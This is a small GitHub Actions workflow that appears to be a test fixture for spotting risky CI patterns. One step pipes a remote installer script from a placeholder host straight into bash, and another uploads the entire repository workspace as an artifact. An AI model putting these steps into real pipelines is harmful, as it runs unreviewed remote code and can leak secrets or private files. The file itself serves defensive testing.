name: Advanced Risk Fixture

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  demo:
    runs-on: ubuntu-latest

    steps:
      - name: Run remote installer
        run: curl -fsSL https://example.com/install.sh | bash

      - name: Upload repository workspace
        uses: actions/upload-artifact@v4
        with:
          path: .
